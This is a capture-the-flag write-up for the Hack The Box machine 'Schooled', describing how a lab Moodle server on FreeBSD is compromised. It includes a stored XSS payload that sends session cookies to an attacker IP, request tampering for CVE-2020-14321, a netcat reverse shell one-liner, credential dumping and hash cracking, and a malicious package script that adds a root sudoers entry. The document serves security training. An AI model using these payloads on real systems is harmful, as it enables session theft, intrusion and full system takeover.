@@ -1,0 +1,224 @@
+                     Schooled
+
+                                                                                9th Sep 2021 / Document No D21.100.130
+                                                                                Prepared By: polarbearer
+                                                                                Machine Author(s): TheCyberGeek
+                                                                                Difficulty: Medium
+                                                                                Classification: Official
+
+Synopsis
+
+Schooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities
+affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained
+together in order to gain access as a teacher user, escalate privileges to a manager user and install a
+malicious plugin resulting in remote command execution. Cracking a hash obtained from the Moodle
+database allows SSH access to the system via password reuse. Privileges can then be escalated to root by
+installing a malicious package (which is possible due to sudo permissions and write access to the
+/etc/hosts file).
+
+Skills Required
+
+      Web enumeration
+      Hash cracking
+      Basic FreeBSD knowledge
+
+Skills Learned
+      Exploiting Moodle vulnerabilities
+      Installing custom FreeBSD packages
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.234 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.234
+
+Nmap reveals that OpenSSH and Apache are listening on their default ports, and another service (possibly
+mysqlx) is listening on port 33060.
+
+Apache
+Browsing to port 80, the web page of the Schooled Educational Institution is shown.
+
+Contact details at the bottom of the page reveal the domain name schooled.htb :
+Another section of the page hints the existence of a Moodle portal.
+
+By fuzzing subdomains of schooled.htb , the moodle.schooled.htb virtual host is discovered:
+   wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:
+   FUZZ.schooled.htb" --hh 20750 http://10.10.10.234
+We add the corresponding entry to our /etc/hosts file and navigate to http://moodle.schooled.htb.
+   echo "10.10.10.234 moodle.schooled.htb schooled.htb" | sudo tee -a /etc/hosts
+
+From the login page ( /moodle/login/index.php ) we can register a new account by clicking the Create
+new account button.
+Note: The email address entered in the registration form must be @student.schooled.htb , otherwise an
+error is returned:
+When accessing the course list as a logged in user, we notice that the Mathematics course allows self
+enrollment, and that no enrollment key is required:
+
+Foothold
+
+After enrolling in the Mathematics course, we can read the announcements posted by the teacher.
+The Reminder for joining students announcement informs us about the requirement to set a
+MoodleNet profile, and also tells us that the teacher will personally check all profiles before the course
+starts:
+
+In order to determine the current Moodle version, we can check the /moodle/lib/upgrade.txt file:
+
+Moodle 3.9 appears to be affected by a stored XSS vulnerability in the MoodleNet profile field (CVE-2020-
+25627). Since we know the teacher is going to check our MoodleNet profile, we can attempt to exploit this
+vulnerability in order to steal his session cookie.
+We can edit this field by opening the Profile page from the upper right menu and then clicking the Edit
+profile link:
+We set the following MoodleNet profile value:
+   <script>document.location="http://10.10.14.178:8000/?"+document.cookie</script>
+
+We click the Update profile button at the bottom of the page and then open a Netcat listener on port
+8000:
+
+   nc -lnvp 8000
+After a few minutes, a request is sent to our listener:
+
+After changing our MoodleSession cookie to the one we just received from our XSS payload and reloading
+the page, we find ourselves logged in as the teacher, Manuel Phillips:
+Another vulnerability affecting Moodle 3.9 (CVE-2020-14321) allows escalation of privileges from the teacher
+role to the manager role. A PoC exploit for this vulnerability is available on GitHub. A video walkthrough is
+also available. First we need to grab the ID of the current user (Manuel Phillips). One way to do this is
+looking at the URL of the profile page linked from the top right menu ( /moodle/user/profile.php?id=24 ).
+Next, we click the Site home link on the left and then select the Mathematics course. We access the
+participant list:
+
+According to the PoC exploit, we need to enroll a user with manager role into our course. The
+/teachers.html page on the main website ( schooled.htb ) lists Lianne Carter as a Manager, making it a
+potential target:
+We click the Enrol users button and select Lianne Carter from the list:
+We send our request to Burp Proxy:
+We modify it by setting the userlist parameter to our ID ( 24 ) and the roletoassign parameter to 1 :
+
+A success message is returned:
+Looking at the user list again, Manuel Phillips is now shown as a Manager:
+After enrolling Lianne Carter, we can click on her name from the user list and then click Log in as from
+her profile page:
+
+We are now logged in as Lianne Carter and have access to the Site administration panel.
+In order to enable plugin install, we follow the PoC for CVE-2020-14321. From Site administration we
+select Users , then Define roles , Manager and Edit :
+We intercept the POST request with Burp Proxy and add the payload from the PoC exploit:
+   &return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&co
+   ntextlevel10=0&<SNIP>
+
+The Install plugins option is now available from the Site administration page.
+
+We can use this plugin to obtain RCE.
+An error is shown but we can select Continue anyway, and the plugin is installed successfully:
+We can now execute arbitrary system commands from the block_rce.php page:
+   curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
+
+We open a Netcat listener on port 7777 and send the following payload:
+   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.178 7777 >/tmp/f
+
+We URL-encode the payload and send it through cURL:
+   curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?
+   cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-
+   i%202%3E%261%7Cnc%2010.10.14.178%207777%20%3E%2Ftmp%2Ff
+
+A reverse shell is sent back to our listener.
+
+We upgrade our shell to an interactive pty:
+   /usr/local/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
+Lateral Movement
+
+After some enumeration we spot that the /usr/local/www/apache24/data/moodle/config.php file
+contains database credentials:
+
+We can access the database and list the available tables:
+   /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
+   moodle@localhost [moodle]> show tables;
+   moodle@localhost [moodle]> desc mdl_user;
+
+We grab the hashes from the mdl_user table:
+   moodle@localhost [moodle]> select username,password from mdl_user;
+
+Interestingly, the admin user has an email address jamie@staff.schooled.htb , and the jamie name
+matches a local user on the system:
+We copy the admin hash to our local machine and crack it using John the Ripper:
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+We can now SSH to the system using credentials jamie:!QAZ2wsx .
+
+The user flag can be found in /home/jamie/user.txt .
+
+Privilege Escalation
+
+Looking at sudo privileges, we observe that the jamie user is allowed to run pkg update and pkg
+install * as user root:
+The FreeBSD pkg command is used to add, remove and upgrade pre-compiled packages. In particular, pkg
+update updates repository data, while pkg install downloads and install packages from the available
+repositories.
+The default repository is defined in /etc/pkg/FreeBSD.conf :
+
+We can see the repository URL is set to http://devops.htb:80/packages .
+The user though belongs to the wheel group:
+
+The group has also write access to the /etc/hosts file:
+   find / -group wheel -perm -020 -ls 2>/dev/null
+An entry for devops.htb with IP address 192.168.1.14 is defined:
+
+We can edit this entry to point to our own IP address in order to trick pkg to update and install a malicious
+package from a repository under our control. First we have to create such package and repository. We
+create a script based on this tutorial and save it as /tmp/pkg/pkg.sh on the target host:
+
+   #!/bin/sh
+
+   STAGEDIR=/tmp/stage
+   rm -rf ${STAGEDIR}
+   mkdir -p ${STAGEDIR}
+
+   cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
+   echo "Adding sudo entry..."
+   echo "jamie ALL=(ALL) NOPASSWD: /bin/csh" >> /usr/local/etc/sudoers
+   EOF
+
+   cat >> ${STAGEDIR}/+MANIFEST <<EOF
+   name: sudo_perms
+   version: "1.0"
+   origin: sysutils/sudo_perms
+   comment: "Add sudo entry"
+   desc: "Add sudo entry"
+   maintainer: maintainer@freebsd.htb
+   www: https://freebsd.htb
+   prefix: /
+   EOF
+
+   echo "deps: {" >> ${STAGEDIR}/+MANIFEST
+   pkg query " %n: { version: \"%v\", origin: %o }" portlint >> ${STAGEDIR}/+MANIFEST
+   pkg query " %n: { version: \"%v\", origin: %o }" poudriere >> ${STAGEDIR}/+MANIFEST
+   echo "}" >> ${STAGEDIR}/+MANIFEST
+   touch ${STAGEDIR}/plist
+   pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
+
+We run the script:
+   chmod +x pkg.sh
+   ./pkg.sh
+A file called sudo_perms-1.0.txz is created:
+
+We can now create a local repository by running the pkg repo . command inside the current directory:
+
+On our local machine we create a packages directory and use scp to copy the repository files:
+   mkdir packages
+   scp jamie@schooled.htb:/tmp/pkg/* packages/
+
+We run a Python http.server on port 80:
+
+sudo python3 -m http.server 80
+
+We modify the devops.htb entry in the /etc/hosts file as follows:
+
+10.10.14.178  devops.htb
+We use the pkg command to update the repository and install our malicious package:
+   sudo pkg update
+   sudo pkg install sudo_perms
+
+Finally we can now run sudo csh to obtain a root shell:
+The root flag can be found in /root/root.txt .
+
